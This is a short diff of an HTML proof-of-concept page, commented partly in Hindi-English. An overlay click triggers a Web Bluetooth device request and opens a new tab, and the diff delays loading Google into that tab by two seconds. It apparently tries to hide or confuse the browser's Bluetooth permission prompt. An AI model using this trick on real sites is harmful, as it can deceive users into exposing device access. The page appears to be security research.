@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Bluetooth PoC</title>
+<title>PoC</title>
 <style>
   html, body {
     margin: 0;
@@ -27,16 +27,21 @@ const overlay = document.getElementById('overlay');
 
 overlay.addEventListener('click', () => {
   try {
-    // 1. Open new tab first (inside gesture)
-    const newTab = window.open('https://www.google.com', '_blank');
+    // 1. Pre-open blank tab (important)
+    const newTab = window.open('about:blank', '_blank');
 
-    // 2. Bluetooth request (NO await)
+    // 2. Trigger Bluetooth (gesture ke andar)
     navigator.bluetooth.requestDevice({
       acceptAllDevices: true
     });
 
-    // 3. Focus new tab
-    if (newTab) newTab.focus();
+    // 3. 2 sec baad Google open + focus
+    setTimeout(() => {
+      if (newTab) {
+        newTab.location.href = 'https://www.google.com';
+        newTab.focus();
+      }
+    }, 2000);
 
   } catch (e) {
     console.log(e);
